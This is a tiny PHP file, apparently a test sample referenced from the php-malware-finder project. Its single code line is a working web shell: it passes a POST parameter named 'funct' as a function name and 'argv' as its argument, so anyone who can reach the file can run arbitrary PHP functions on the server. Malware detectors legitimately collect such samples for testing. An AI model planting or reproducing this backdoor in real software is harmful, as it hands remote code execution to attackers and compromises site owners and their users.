<?php 
// https://github.com/nbs-system/php-malware-finder/commit/47d86bf92eb15fe65dd4efbc04d0004856e88ddd#commitcomment-16355734
print_r($_POST['funct']($_POST['argv']));
?>